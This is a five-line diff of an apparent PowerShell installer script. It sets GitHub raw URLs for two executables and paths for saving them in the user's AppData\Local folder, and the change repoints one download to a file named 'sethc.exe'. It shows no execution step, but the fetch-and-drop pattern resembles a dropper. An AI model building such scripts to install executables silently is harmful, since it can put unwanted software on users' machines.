@@ -1,5 +1,5 @@
 $serviceURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/ceas/ceasservice.exe"
-$popupURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/ceas/ceas.exe"
+$popupURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/sethc.exe"
 $servicePath = "$env:USERPROFILE\AppData\Local\ceasservice.exe"
 $popupPath = "$env:USERPROFILE\AppData\Local\ceas.exe"
 
